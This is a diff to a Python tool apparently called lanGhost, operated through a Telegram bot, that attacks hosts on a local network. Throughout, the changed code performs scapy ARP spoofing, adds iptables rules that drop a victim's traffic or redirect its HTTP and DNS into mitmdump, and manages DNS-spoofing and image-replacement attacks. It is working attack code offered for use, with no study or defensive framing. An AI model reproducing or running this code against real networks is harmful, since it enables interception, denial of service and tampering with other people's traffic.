@@ -6,7 +6,7 @@
 try:
     import logging
     logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
-    
+
     from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
     from netaddr import IPAddress
     from scapy.all import send, ARP
@@ -77,17 +77,20 @@ def iptables(action, target=False):
 
     if action == "kill":
         print("[+] Dropping connections from " + target + " with iptables...")
-        os.system("iptables -I FORWARD -s " + target + " -j DROP")
+        os.system("sudo iptables -I FORWARD 1 -s " + target + " -j DROP")
+        os.system("sudo iptables -A INPUT -s " + target + " -p tcp --dport 8080 -j DROP")
+        os.system("sudo iptables -A INPUT -s " + target + " -p tcp --dport 53 -j DROP")
+        os.system("sudo iptables -A INPUT -s " + target + " -p udp --dport 53 -j DROP")
 
     if action == "stopkill":
         print("[+] Stopping iptables kill for " + target)
-        os.system("iptables -D FORWARD -s " + target + " -j DROP")
+        os.system("sudo iptables -D FORWARD -s " + target + " -j DROP")
 
     if action == "mitm":
         print("[+] Routing " + target + " into mitmdump with iptables")
-        os.system("sudo iptables -t nat -I PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
-        os.system("sudo iptables -t nat -I PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
-        os.system("sudo iptables -t nat -I PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")
+        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p tcp --destination-port 53 -j REDIRECT --to-port 53")
+        os.system("sudo iptables -t nat -A PREROUTING -s " + target + " -p udp --destination-port 53 -j REDIRECT --to-port 53")
 
     if action == "stopmitm":
         print("[+] Stopping iptables mitm for " + target)
@@ -191,49 +194,17 @@ def subscriptionHandler(bot):
 
         time.sleep(20)
 
-def arpSpoof(target, ID, atype):
+def arpSpoof(target):
     global iface_mac
     global gw_ip
     global gw_mac
+    print("[+] ARP Spoofing " + str(target[0]) + "...")
     while True:
-        if attackManager("isrunning", ID=ID) == True:
+        if attackManager("isattacked", target=target[0]) == True:
             send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), count=100, verbose=False)
             time.sleep(1)
         else:
-            if atype == "kill":
-                iptables("stopkill", target=target[0])
-            elif atype == "mitm":
-                iptables("stopmitm", target=target[0])
-            elif atype == "replaceimg":
-                iptables("stopmitm", target=target[0])
-
-                DBconn = sqlite3.connect(script_path + "lanGhost.db")
-                DBcursor = DBconn.cursor()
-                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
-                DBconn.commit()
-                DBconn.close()
-
-                DBconn = sqlite3.connect(script_path + "lanGhost.db")
-                DBcursor = DBconn.cursor()
-                DBcursor.execute("DELETE FROM lanGhost_img WHERE attackid=?", [str(ID)])
-                DBconn.commit()
-                DBconn.close()
-
-            elif atype == "spoofdns":
-                iptables("stopmitm", target=target[0])
-
-                DBconn = sqlite3.connect(script_path + "lanGhost.db")
-                DBcursor = DBconn.cursor()
-                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
-                DBconn.commit()
-                DBconn.close()
-
-                DBconn = sqlite3.connect(script_path + "lanGhost.db")
-                DBcursor = DBconn.cursor()
-                DBcursor.execute("DELETE FROM lanGhost_dns WHERE attackid=?", [str(ID)])
-                DBconn.commit()
-                DBconn.close()
-
+            print("[+] Stopping ARP Spoof for " + str(target[0]) + "...")
             send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), count=100, verbose=False)
             break
 
@@ -313,6 +284,18 @@ def attackManager(action, attack_type=False, target=False, ID=False):
                 return True
         return False
 
+    elif action == "gettype":
+        for attack in running_attacks:
+            if attack[0] == int(ID):
+                return attack[1]
+        return False
+
+    elif action == "gettarget":
+        for attack in running_attacks:
+            if attack[0] == int(ID):
+                return attack[2]
+        return False
+
     elif action == "list":
         return running_attacks
 
@@ -362,10 +345,6 @@ def msg_kill(bot, update, args):
 
     target_ip = args[0]
 
-    if attackManager("isattacked", target=target_ip):
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
-        return
-
     global latest_scan
     hosts = latest_scan[:]
     target_mac = False
@@ -376,13 +355,15 @@ def msg_kill(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
         return
 
-    ID = attackManager("new", attack_type="mitm", target=target_ip)
-
     target = [target_ip, target_mac]
     iptables("kill", target=target[0])
-    kill_thread = threading.Thread(target=arpSpoof, args=[target, ID, "kill"])
-    kill_thread.daemon = True
-    kill_thread.start()
+    if not attackManager("isattacked", target=target_ip):
+        ID = attackManager("new", attack_type="kill", target=target_ip)
+        kill_thread = threading.Thread(target=arpSpoof, args=[target])
+        kill_thread.daemon = True
+        kill_thread.start()
+    else:
+        ID = attackManager("new", attack_type="kill", target=target_ip)
 
     bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
     bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
@@ -393,21 +374,66 @@ def msg_stop(bot, update, args):
     if not str(update.message.chat_id) == str(admin_chatid):
         return
 
-    if args == []:
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /stop [ATTACK ID]")
-        return
-
     try:
-        ID = int(args[0])
+        if args == []:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /stop [ATTACK ID]")
+            return
+
+        try:
+            ID = int(args[0])
+        except:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Attack ID must be a number.")
+            return
+
+        if not attackManager("isrunning", ID=ID):
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ No attack with ID " + str(ID) + ".")
+            return
+
+        atype = attackManager("gettype", ID=ID)
+        target = attackManager("gettarget", ID=ID)
+
+        attackManager("del", ID=ID)
+
+        global script_path
+        if atype == "kill":
+            iptables("stopkill", target=target)
+
+        elif atype == "mitm":
+            iptables("stopmitm", target=target)
+
+        elif atype == "replaceimg":
+            iptables("stopmitm", target=target)
+
+            DBconn = sqlite3.connect(script_path + "lanGhost.db")
+            DBcursor = DBconn.cursor()
+            DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
+            DBconn.commit()
+            DBconn.close()
+
+            DBconn = sqlite3.connect(script_path + "lanGhost.db")
+            DBcursor = DBconn.cursor()
+            DBcursor.execute("DELETE FROM lanGhost_img WHERE attackid=?", [str(ID)])
+            DBconn.commit()
+            DBconn.close()
+
+        elif atype == "spoofdns":
+            iptables("stopmitm", target=target)
+
+            DBconn = sqlite3.connect(script_path + "lanGhost.db")
+            DBcursor = DBconn.cursor()
+            DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
+            DBconn.commit()
+            DBconn.close()
+
+            DBconn = sqlite3.connect(script_path + "lanGhost.db")
+            DBcursor = DBconn.cursor()
+            DBcursor.execute("DELETE FROM lanGhost_dns WHERE attackid=?", [str(ID)])
+            DBconn.commit()
+            DBconn.close()
+
+        bot.send_message(chat_id=update.message.chat_id, text="✅ Attack " + str(ID) + " stopped...")
     except:
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Attack ID must be a number.")
-        return
-
-    if not attackManager("del", ID=ID):
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ No attack with ID " + str(ID) + ".")
-        return
-
-    bot.send_message(chat_id=update.message.chat_id, text="✅ Attack " + str(ID) + " stopped...")
+        print("[!!!] " + str(traceback.format_exc()))
 
 def msg_attacks(bot, update, args):
     global admin_chatid
@@ -436,10 +462,6 @@ def msg_mitm(bot, update, args):
 
     target_ip = args[0]
 
-    if attackManager("isattacked", target=target_ip):
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
-        return
-
     global latest_scan
     hosts = latest_scan[:]
     target_mac = False
@@ -450,13 +472,16 @@ def msg_mitm(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
         return
 
-    ID = attackManager("new", attack_type="mitm", target=target_ip)
-
     target = [target_ip, target_mac]
     iptables("mitm", target=target[0])
-    arp_thread = threading.Thread(target=arpSpoof, args=[target, ID, "mitm"])
-    arp_thread.daemon = True
-    arp_thread.start()
+    if not attackManager("isattacked", target=target_ip):
+        ID = attackManager("new", attack_type="mitm", target=target_ip)
+        arp_thread = threading.Thread(target=arpSpoof, args=[target])
+        arp_thread.daemon = True
+        arp_thread.start()
+    else:
+        ID = attackManager("new", attack_type="mitm", target=target_ip)
+
     mitm_thread = threading.Thread(target=mitmHandler, args=[target, ID, bot])
     mitm_thread.daemon = True
     mitm_thread.start()
@@ -495,15 +520,18 @@ def msg_img(bot, update):
                     img64 = base64.b64encode(img)
 
                     target = json.loads(attack[1])
-                    ID = attackManager("new", attack_type="replaceimg", target=target[0])
 
                     DBcursor.execute("UPDATE lanGhost_img SET img=?, attackid=?  WHERE target=?", [img64, str(ID), attack[1]])
                     DBconn.commit()
 
                     iptables("mitm", target=target[0])
-                    arp_thread = threading.Thread(target=arpSpoof, args=[target, ID, "replaceimg"])
-                    arp_thread.daemon = True
-                    arp_thread.start()
+                    if not attackManager("isattacked", target=target_ip):
+                        ID = attackManager("new", attack_type="replaceimg", target=target[0])
+                        arp_thread = threading.Thread(target=arpSpoof, args=[target])
+                        arp_thread.daemon = True
+                        arp_thread.start()
+                    else:
+                        ID = attackManager("new", attack_type="replaceimg", target=target[0])
 
                     bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
                     bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
@@ -524,10 +552,6 @@ def msg_replaceimg(bot, update, args):
             return
 
         target_ip = args[0]
-
-        if attackManager("isattacked", target=target_ip):
-            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
-            return
 
         global latest_scan
         hosts = latest_scan[:]
@@ -572,10 +596,6 @@ def msg_spoofdns(bot, update, args):
         domain = args[1]
         fakeip = args[2]
 
-        if attackManager("isattacked", target=target_ip):
-            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
-            return
-
         global latest_scan
         hosts = latest_scan[:]
         target_mac = False
@@ -594,11 +614,14 @@ def msg_spoofdns(bot, update, args):
         DBconn.commit()
         DBconn.close()
 
-        ID = attackManager("new", attack_type="spoofdns", target=target[0])
         iptables("mitm", target=target[0])
-        arp_thread = threading.Thread(target=arpSpoof, args=[target, ID, "spoofdns"])
-        arp_thread.daemon = True
-        arp_thread.start()
+        if not attackManager("isattacked", target=target_ip):
+            ID = attackManager("new", attack_type="spoofdns", target=target[0])
+            arp_thread = threading.Thread(target=arpSpoof, args=[target])
+            arp_thread.daemon = True
+            arp_thread.start()
+        else:
+            ID = attackManager("new", attack_type="spoofdns", target=target[0])
 
         DBconn = sqlite3.connect(script_path + "lanGhost.db")
         DBcursor = DBconn.cursor()
@@ -716,7 +739,7 @@ if __name__ == '__main__':
     os.system("rm -r " + script_path + "lanGhost.db > /dev/null 2>&1")
 
     os.system("sudo screen -S lanGhost-mitm -m -d mitmdump -T --host -s " + script_path + "proxyScript.py")
-    os.system("sudo screen -S lanGhost-dns -m -d python3 " + script_path + "dnsserver.py")
+    os.system("sudo screen -S lanGhost-dns -m -d python3 " + script_path + "dnsServer.py")
     refreshNetworkInfo()
     iptables("setup")
 
